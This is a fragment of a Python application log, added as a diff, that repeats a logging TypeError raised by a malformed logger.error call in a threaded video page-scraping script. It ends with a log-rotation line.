+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('41', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('41', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('25', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/__init__.py", line 994, in emit
+    msg = self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('25', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('25', '请求无数据，放入错误列表')
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/logging/handlers.py", line 71, in emit
+    if self.shouldRollover(record):
+  File "/usr/lib/python3.6/logging/handlers.py", line 187, in shouldRollover
+    msg = "%s\n" % self.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 840, in format
+    return fmt.format(record)
+  File "/usr/lib/python3.6/logging/__init__.py", line 577, in format
+    record.message = record.getMessage()
+  File "/usr/lib/python3.6/logging/__init__.py", line 338, in getMessage
+    msg = msg % self.args
+TypeError: not all arguments converted during string formatting
+Call stack:
+  File "/usr/lib/python3.6/threading.py", line 884, in _bootstrap
+    self._bootstrap_inner()
+  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.6/threading.py", line 864, in run
+    self._target(*self._args, **self._kwargs)
+  File "./video/func/GetPageData.py", line 87, in wrapper
+    func(obj)
+  File "./video/func/GetPageData.py", line 156, in add_page_to_queue
+    logger.error('page:', url.split('?p=')[1], '请求无数据，放入错误列表')
+Message: 'page:'
+Arguments: ('25', '请求无数据，放入错误列表')
+[1591977602] logsize: 120241, triggering log-reopen...
